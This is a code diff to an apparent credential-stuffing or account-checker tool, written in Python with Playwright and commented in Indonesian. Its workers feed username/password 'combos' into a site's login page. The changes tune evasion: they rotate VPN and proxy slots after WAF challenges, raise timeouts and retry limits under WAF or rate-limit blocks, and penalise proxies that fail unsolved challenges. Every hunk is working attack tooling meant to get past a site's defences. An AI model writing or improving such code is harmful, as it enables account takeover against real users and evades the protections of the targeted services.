@@ -3803,6 +3803,10 @@ def _maybe_rotate_vpnpool_slot(proxy: dict | None):
             _VPNPOOL_CFG['lock'] = lk
         p = None
         try:
+            # Drain active co-workers briefly before killing this tunnel so in-flight logins aren't cut
+            _drain_end = time.monotonic() + 8.0
+            while _PROXY_LOAD.get(srv, 0) > 0 and time.monotonic() < _drain_end and _VPNPOOL_CFG.get('started'):
+                await asyncio.sleep(0.3)
             async with lk:
                 if not _VPNPOOL_CFG.get('started'):
                     return
@@ -4135,8 +4139,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
         except Exception:
             pass
         await p.route(_ROUTE_RE, _route_filter)
-        p.set_default_timeout(12000)
-        await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=10000)
+        p.set_default_timeout(15000)
+        await p.goto(LOGIN_PAGE, wait_until="domcontentloaded", timeout=15000)
 
     async def open_context_and_page(max_attempts: int = 4, rotate_ip: bool = False) -> bool:
         """Buka context baru pada sticky proxy + navigasi ke login page."""
@@ -4842,7 +4846,8 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                     # ponytail: don't double-count full t_try when WAF/proxy wait already recorded its seconds
                     if kind != 'WAF' and err_msg not in ('timeout_waiting_response', 'PROXY_HTTP_ERR', '407_TRAFFIC_EXHAUSTED'):
                         _PERF.record_stall('retry', max(0.5, time.monotonic() - t_try))
-                    if _acct_retries[k_id] > 4:
+                    _max_ret = 6 if (kind in ('WAF', 'RATE') or 'timeout' in err_low or 'proxy' in err_low) else 4
+                    if _acct_retries[k_id] > _max_ret:
                         _acct_retries.pop(k_id, None)
                         stats['checked'] += 1
                         _PERF.mark_check()
@@ -4869,13 +4874,14 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
 
                     if kind == 'WAF':
                         stats['waf'] += 1
-                        if cur_proxy_info and (ctx_accts >= 3 or _acct_retries[k_id] >= 2):
+                        _hard_waf = (err_msg == 'waf_challenge_unsolved')
+                        if cur_proxy_info and (_hard_waf or ctx_accts >= 3 or _acct_retries[k_id] >= 2):
                             pk = (cur_proxy_info.get('server', ''), cur_proxy_info.get('username', ''))
-                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + 1
+                            _PROXY_FAILS[pk] = _PROXY_FAILS.get(pk, 0) + (2 if _hard_waf else 1)
                             if _PROXY_FAILS[pk] >= 3:
                                 _maybe_rotate_vpnpool_slot(cur_proxy_info)
                         did_vpn = (await vpn_coord.on_waf_or_rate(seen_vpn_ep, 'WAF', browser_state, stats)) if (vpn_coord and _acct_retries[k_id] in (1, 3)) else False
-                        waf_mode = 'rotate' if (did_vpn or ctx_accts >= 4 or _acct_retries[k_id] >= 2) else 'waf_refresh'
+                        waf_mode = 'rotate' if (did_vpn or (_hard_waf and len(pool) > 1) or ctx_accts >= 4 or _acct_retries[k_id] >= 2) else 'waf_refresh'
                         if not await _recover_ctx(my_gen, waf_mode):
                             raise RuntimeError(f"w{wid}_waf_recovery_failed")
                     elif kind == 'RATE' or res_data.get('proxy_407') or any(k in err_msg for k in ('TUNNEL', 'PROXY', 'SOCKS', 'CONNECTION_FAILED', 'TIMED_OUT', 'Connection closed', 'Target closed')) or err_msg == 'timeout_waiting_response':
@@ -4925,7 +4931,7 @@ async def run_worker(wid: int, combos: list, combo_q: asyncio.Queue,
                 lambda: (combo_q.pending <= 0) or bool(wave_limit and stats['checked'] >= wave_limit) or bool(vpn_coord and vpn_coord.ovpn_failed),
             ):
                 return
-        if not await _open_ready_ctx(max_tries=3):
+        if not await _open_ready_ctx(max_tries=4):
             if not _TUI_ACTIVE: p_out(f"{c(RED)}[!] Worker {wid} gagal startup, mencoba restart...{W}")
             if combo_q.pending > 0:
                 raise RuntimeError(f"w{wid}_startup_failed")
